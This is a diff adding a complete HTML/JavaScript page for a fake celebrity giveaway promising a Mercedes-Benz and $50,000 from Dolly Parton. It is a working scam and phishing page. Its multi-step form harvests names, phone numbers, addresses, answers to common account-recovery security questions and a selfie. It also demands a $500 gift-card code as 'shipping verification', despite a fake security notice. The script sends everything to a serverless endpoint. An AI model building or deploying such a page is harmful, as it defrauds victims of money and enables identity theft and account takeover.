@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Dolly Parton's Mercedes-Benz & $50K Giveaway | Official Entry</title>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&family=Playfair+Display:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a1a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem 1.5rem;
+            position: relative;
+            overflow-x: hidden;
+        }
+        .sliding-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+            opacity: 0.35;
+            pointer-events: none;
+        }
+        .bg-track {
+            display: flex;
+            width: calc(300px * 20);
+            animation: scrollBg 55s linear infinite;
+        }
+        .bg-slide {
+            width: 300px;
+            height: 100vh;
+            flex-shrink: 0;
+            background-size: cover;
+            background-position: center 30%;
+            filter: brightness(0.75);
+        }
+        @keyframes scrollBg {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-50%); }
+        }
+        .overlay-mist {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, rgba(10,10,30,0.7) 0%, rgba(0,0,0,0.8) 100%);
+            z-index: 1;
+            pointer-events: none;
+        }
+        .form-container {
+            position: relative;
+            z-index: 10;
+            max-width: 880px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            backdrop-filter: blur(2px);
+            border-radius: 2rem;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.3);
+            overflow: hidden;
+            animation: fadeSlideUp 0.6s ease;
+        }
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .form-header {
+            background: linear-gradient(135deg, #c62828, #8b1e1e);
+            padding: 1.8rem;
+            text-align: center;
+            color: white;
+        }
+        .form-header h1 {
+            font-family: 'Playfair Display', serif;
+            font-size: 1.9rem;
+        }
+        .prize-badge {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin: 1rem 0 0.5rem;
+            flex-wrap: wrap;
+        }
+        .prize-item {
+            background: rgba(255,255,200,0.2);
+            padding: 0.4rem 1rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+        .security-note {
+            background: #ffecb3;
+            color: #b65e00;
+            padding: 0.8rem;
+            margin: 1rem 1.5rem 0;
+            border-radius: 1rem;
+            font-size: 0.85rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            justify-content: center;
+            border-left: 5px solid #c62828;
+        }
+        .step-indicator {
+            display: flex;
+            background: #f9f3e7;
+            padding: 1rem;
+            justify-content: space-between;
+            border-bottom: 1px solid #eeddcc;
+        }
+        .step {
+            flex: 1;
+            text-align: center;
+            font-weight: 600;
+            color: #a98467;
+            position: relative;
+        }
+        .step.active {
+            color: #c62828;
+        }
+        .step.active::after {
+            content: '';
+            position: absolute;
+            bottom: -12px;
+            left: 30%;
+            width: 40%;
+            height: 3px;
+            background: #c62828;
+            border-radius: 3px;
+        }
+        .form-step {
+            padding: 2rem;
+            display: none;
+            animation: fadeStep 0.4s ease;
+        }
+        .form-step.active-step {
+            display: block;
+        }
+        @keyframes fadeStep {
+            from { opacity: 0; transform: translateX(10px);}
+            to { opacity: 1; transform: translateX(0);}
+        }
+        .input-group {
+            margin-bottom: 1.4rem;
+        }
+        .input-group label {
+            font-weight: 600;
+            display: block;
+            margin-bottom: 0.4rem;
+            color: #2c1810;
+        }
+        .input-group input, .input-group select, .input-group textarea {
+            width: 100%;
+            padding: 0.8rem 1rem;
+            border: 1.5px solid #e2d9cf;
+            border-radius: 1rem;
+            font-family: 'Inter', sans-serif;
+            transition: 0.2s;
+        }
+        .input-group input:focus, .input-group select:focus, .input-group textarea:focus {
+            border-color: #c62828;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(198,40,40,0.2);
+        }
+        .file-upload {
+            border: 2px dashed #c99e7e;
+            padding: 1rem;
+            border-radius: 1rem;
+            text-align: center;
+            background: #fffaf2;
+            cursor: pointer;
+        }
+        .btn-next, .btn-prev, .submit-final {
+            background: #c62828;
+            color: white;
+            border: none;
+            padding: 0.8rem 1.8rem;
+            border-radius: 2rem;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 1rem;
+            transition: 0.2s;
+        }
+        .btn-prev {
+            background: #7f5e4a;
+            margin-right: 1rem;
+        }
+        .btn-next:hover, .submit-final:hover {
+            background: #9e2a2a;
+            transform: scale(1.02);
+        }
+        .tracking-area {
+            background: #eef4ff;
+            border-radius: 1rem;
+            padding: 1rem;
+            margin-top: 1rem;
+            text-align: center;
+            font-family: monospace;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+        .error-msg {
+            color: #d32f2f;
+            font-size: 0.7rem;
+            margin-top: 4px;
+        }
+        .success-toast {
+            background: #2e7d32;
+            color: white;
+            padding: 1rem;
+            border-radius: 1rem;
+            text-align: center;
+            margin-top: 1rem;
+            display: none;
+        }
+        .legal-footer {
+            font-size: 0.7rem;
+            text-align: center;
+            background: #f8f0e6;
+            padding: 1rem;
+            color: #6b4c3b;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 650px) {
+            .form-step { padding: 1.2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="sliding-bg">
+    <div class="bg-track" id="bgTrack"></div>
+</div>
+<div class="overlay-mist"></div>
+
+<div class="form-container">
+    <div class="form-header">
+        <h1><i class="fas fa-star"></i> DOLLY PARTON'S MERCEDES & $50K GIVEAWAY <i class="fas fa-car"></i></h1>
+        <div class="prize-badge">
+            <span class="prize-item"><i class="fas fa-money-bill-wave"></i> $50,000 CASH</span>
+            <span class="prize-item"><i class="fas fa-car-side"></i> BRAND NEW MERCEDES-BENZ</span>
+            <span class="prize-item"><i class="fas fa-gem"></i> Ultimate Fan Experience</span>
+        </div>
+    </div>
+    
+    <div class="security-note">
+        <i class="fas fa-shield-alt fa-lg"></i> 🔒 SECURITY NOTICE: We will NEVER ask for your credit/debit card or bank account details. For shipping verification, a $500 Gift Card payment is required. Your privacy is our priority!
+    </div>
+    
+    <div class="step-indicator">
+        <div class="step active" id="step1Label">1. Identity & Fan Info</div>
+        <div class="step" id="step2Label">2. Security & Selfie</div>
+        <div class="step" id="step3Label">3. Shipping & Payment</div>
+        <div class="step" id="step4Label">4. Tracking & Submit</div>
+    </div>
+
+    <form id="mainGiveawayForm">
+        <!-- STEP 1 -->
+        <div class="form-step active-step" id="step1">
+            <div class="input-group">
+                <label><i class="fas fa-user"></i> Full Legal Name *</label>
+                <input type="text" id="fullname" placeholder="First & Last Name" required>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-envelope"></i> Email Address *</label>
+                <input type="email" id="email" placeholder="fan@example.com" required>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-phone"></i> Phone Number *</label>
+                <input type="tel" id="phone" placeholder="(123) 456-7890" required>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-heart"></i> How long have you been a Dolly Parton fan? *</label>
+                <select id="fanDuration">
+                    <option value="">Select</option>
+                    <option>Less than 1 year</option>
+                    <option>1-5 years</option>
+                    <option>6-10 years</option>
+                    <option>10-20 years</option>
+                    <option>Since the beginning! 20+ years</option>
+                </select>
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-music"></i> What do you love most about Dolly Parton? *</label>
+                <textarea id="dollyLove" rows="2" placeholder="Her voice, philanthropy, songwriting, style..."></textarea>
+            </div>
+            <div style="display: flex; justify-content: flex-end;">
+                <button type="button" class="btn-next" onclick="nextStep(2)">Next: Security & Selfie <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 2 -->
+        <div class="form-step" id="step2">
+            <div class="input-group">
+                <label><i class="fas fa-question-circle"></i> Security Question 1 *</label>
+                <select id="secQ1">
+                    <option value="">Choose a question</option>
+                    <option>What is your mother's maiden name?</option>
+                    <option>What was the name of your first pet?</option>
+                    <option>What city were you born in?</option>
+                </select>
+                <input type="text" id="secA1" placeholder="Your answer" style="margin-top: 8px;">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-question-circle"></i> Security Question 2 *</label>
+                <select id="secQ2">
+                    <option value="">Choose a question</option>
+                    <option>What was your first car?</option>
+                    <option>Name of your childhood best friend?</option>
+                    <option>What is your dream Mercedes model?</option>
+                </select>
+                <input type="text" id="secA2" placeholder="Your answer" style="margin-top: 8px;">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-camera"></i> Take a Selfie or Upload Photo (Required) *</label>
+                <div class="file-upload" onclick="document.getElementById('selfieInput').click()">
+                    <i class="fas fa-camera-retro fa-2x"></i>
+                    <p>Click to upload your selfie (jpg/png)</p>
+                </div>
+                <input type="file" id="selfieInput" accept="image/*" style="display: none;">
+                <div id="selfiePreview" style="margin-top: 8px; font-size: 0.8rem; color: green;"></div>
+            </div>
+            <div style="display: flex; justify-content: space-between;">
+                <button type="button" class="btn-prev" onclick="prevStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
+                <button type="button" class="btn-next" onclick="nextStep(3)">Next: Shipping & Payment <i class="fas fa-arrow-right"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 3 -->
+        <div class="form-step" id="step3">
+            <div class="input-group">
+                <label><i class="fas fa-map-marker-alt"></i> Shipping Address *</label>
+                <input type="text" id="address" placeholder="Street Address">
+                <input type="text" id="city" placeholder="City" style="margin-top: 8px;">
+                <input type="text" id="state" placeholder="State / Province" style="margin-top: 8px;">
+                <input type="text" id="zip" placeholder="Postal Code" style="margin-top: 8px;">
+            </div>
+            <div class="input-group">
+                <label><i class="fas fa-gift-card"></i> $500.00 Shipping Verification (Gift Card Only) *</label>
+                <input type="text" id="giftCardNumber" placeholder="Gift Card Code">
+                <div class="file-upload" style="margin-top: 10px;" onclick="document.getElementById('receiptUpload').click()">
+                    <i class="fas fa-receipt"></i> Upload Receipt (Optional)
+                </div>
+                <input type="file" id="receiptUpload" accept="image/*" style="display: none;">
+            </div>
+            <div style="display: flex; justify-content: space-between;">
+                <button type="button" class="btn-prev" onclick="prevStep(2)"><i class="fas fa-arrow-left"></i> Back</button>
+                <button type="button" class="btn-next" onclick="nextStep(4)">Review & Generate Tracking <i class="fas fa-truck"></i></button>
+            </div>
+        </div>
+
+        <!-- STEP 4 -->
+        <div class="form-step" id="step4">
+            <div class="tracking-area" id="trackingDisplay">
+                Click "Submit" to create your unique tracking ID
+            </div>
+            <div class="input-group">
+                <input type="checkbox" id="confirmFinal"> 
+                <label for="confirmFinal">I confirm that all information provided is accurate *</label>
+            </div>
+            <div style="display: flex; justify-content: space-between;">
+                <button type="button" class="btn-prev" onclick="prevStep(3)">Back</button>
+                <button type="button" class="submit-final" id="finalSubmitBtn">Submit Entry</button>
+            </div>
+            <div id="finalSuccessMsg" class="success-toast"></div>
+        </div>
+    </form>
+    <div class="legal-footer">
+        <i class="fas fa-guitar"></i> Dolly's Dream Giveaway | Mercedes-Benz & $50,000
+    </div>
+</div>
+
+<script>
+    let currentStep = 1;
+    let selfieFile = null;
+    let receiptFile = null;
+    let generatedTracking = "";
+    
+    // Background images setup
+    function initSlidingBg() {
+        const track = document.getElementById('bgTrack');
+        for(let i = 0; i < 12; i++) {
+            let slide = document.createElement('div');
+            slide.className = 'bg-slide';
+            slide.style.background = 'linear-gradient(135deg,#5f3e4a,#2e1a24)';
+            track.appendChild(slide);
+        }
+    }
+    window.addEventListener('load', initSlidingBg);
+    
+    // File handlers
+    document.getElementById('selfieInput').addEventListener('change', function(e) {
+        if(e.target.files.length > 0) {
+            selfieFile = e.target.files[0];
+            document.getElementById('selfiePreview').innerHTML = `<i class="fas fa-check-circle"></i> Selfie uploaded: ${selfieFile.name}`;
+        }
+    });
+    
+    document.getElementById('receiptUpload').addEventListener('change', function(e) {
+        if(e.target.files.length > 0) {
+            receiptFile = e.target.files[0];
+        }
+    });
+    
+    // Navigation
+    window.nextStep = function(stepNumber) {
+        if(stepNumber === 2 && !validateStep1()) return;
+        if(stepNumber === 3 && !validateStep2()) return;
+        if(stepNumber === 4 && !validateStep3()) return;
+        currentStep = stepNumber;
+        updateStepUI();
+        if(currentStep === 4) generateTrackingPreview();
+    };
+    
+    window.prevStep = function(stepNumber) {
+        currentStep = stepNumber;
+        updateStepUI();
+    };
+    
+    function updateStepUI() {
+        const steps = document.querySelectorAll('.form-step');
+        const stepLabels = document.querySelectorAll('.step');
+        steps.forEach((step, idx) => {
+            if(idx+1 === currentStep) step.classList.add('active-step');
+            else step.classList.remove('active-step');
+        });
+        stepLabels.forEach((label, idx) => {
+            if(idx+1 === currentStep) label.classList.add('active');
+            else label.classList.remove('active');
+        });
+    }
+    
+    function validateStep1() {
+        let name = document.getElementById('fullname').value.trim();
+        let email = document.getElementById('email').value.trim();
+        let phone = document.getElementById('phone').value.trim();
+        let fanDur = document.getElementById('fanDuration').value;
+        let dollyLove = document.getElementById('dollyLove').value.trim();
+        if(!name) { alert("Full name required."); return false; }
+        if(!email || !email.includes('@')) { alert("Valid email required."); return false; }
+        if(!phone) { alert("Phone number required."); return false; }
+        if(!fanDur) { alert("Please select how long you've been a fan."); return false; }
+        if(!dollyLove) { alert("Tell us what you love about Dolly Parton!"); return false; }
+        return true;
+    }
+    
+    function validateStep2() {
+        let q1 = document.getElementById('secQ1').value;
+        let a1 = document.getElementById('secA1').value.trim();
+        let q2 = document.getElementById('secQ2').value;
+        let a2 = document.getElementById('secA2').value.trim();
+        if(!q1 || !a1) { alert("Please select security question 1 and provide answer."); return false; }
+        if(!q2 || !a2) { alert("Please select security question 2 and provide answer."); return false; }
+        if(!selfieFile) { alert("You must upload a selfie photo."); return false; }
+        return true;
+    }
+    
+    function validateStep3() {
+        let address = document.getElementById('address').value.trim();
+        let city = document.getElementById('city').value.trim();
+        let zip = document.getElementById('zip').value.trim();
+        let giftCode = document.getElementById('giftCardNumber').value.trim();
+        if(!address || !city || !zip) { alert("Please enter full shipping address."); return false; }
+        if(!giftCode) { alert("Please enter the $500 Gift Card code."); return false; }
+        return true;
+    }
+    
+    function generateTrackingPreview() {
+        let randomNum = Math.floor(Math.random() * 1000000000);
+        generatedTracking = `DOLLY-${randomNum.toString().slice(0,8)}-${Date.now().toString().slice(-5)}`;
+        document.getElementById('trackingDisplay').innerHTML = `<i class="fas fa-qrcode"></i> ${generatedTracking}`;
+    }
+    
+    // Submit to Netlify Function
+    document.getElementById('finalSubmitBtn').addEventListener('click', async function() {
+        let confirmBox = document.getElementById('confirmFinal');
+        if(!confirmBox.checked) {
+            alert("You must confirm that all information is accurate.");
+            return;
+        }
+        if(!generatedTracking) generateTrackingPreview();
+        
+        // Collect form data
+        const formData = {
+            trackingNumber: generatedTracking,
+            fullName: document.getElementById('fullname').value,
+            email: document.getElementById('email').value,
+            phone: document.getElementById('phone').value,
+            fanDuration: document.getElementById('fanDuration').value,
+            dollyLove: document.getElementById('dollyLove').value,
+            securityQ1: document.getElementById('secQ1').value,
+            securityA1: document.getElementById('secA1').value,
+            securityQ2: document.getElementById('secQ2').value,
+            securityA2: document.getElementById('secA2').value,
+            address: document.getElementById('address').value,
+            city: document.getElementById('city').value,
+            state: document.getElementById('state').value,
+            zip: document.getElementById('zip').value,
+            giftCardCode: document.getElementById('giftCardNumber').value
+        };
+        
+        // Create FormData for file upload
+        const submitData = new FormData();
+        submitData.append('formData', JSON.stringify(formData));
+        if(selfieFile) submitData.append('selfie', selfieFile);
+        if(receiptFile) submitData.append('receipt', receiptFile);
+        
+        const submitBtn = document.getElementById('finalSubmitBtn');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting...';
+        submitBtn.disabled = true;
+        
+        try {
+            const response = await fetch('/.netlify/functions/submit', {
+                method: 'POST',
+                body: submitData
+            });
+            
+            const result = await response.json();
+            
+            if(result.success) {
+                const successDiv = document.getElementById('finalSuccessMsg');
+                successDiv.style.display = 'block';
+                successDiv.innerHTML = `
+                    <i class="fas fa-check-circle"></i> 
+                    🎉 SUCCESS, ${formData.fullName}!<br>
+                    Your entry has been submitted to Google Sheets!<br>
+                    <strong>Tracking Number:</strong> ${result.trackingNumber}<br>
+                    A confirmation email will be sent to ${formData.email}
+                `;
+                successDiv.scrollIntoView({ behavior: 'smooth' });
+                
+                // Reset form
+                setTimeout(() => {
+                    document.getElementById('mainGiveawayForm').reset();
+                    document.getElementById('selfiePreview').innerHTML = '';
+                    submitBtn.innerHTML = originalText;
+                    submitBtn.disabled = false;
+                }, 3000);
+            } else {
+                alert('Error: ' + (result.error || 'Submission failed'));
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+            }
+        } catch(error) {
+            console.error('Submission error:', error);
+            alert('Failed to submit. Please make sure the Netlify function is deployed.');
+            submitBtn.innerHTML = originalText;
+            submitBtn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
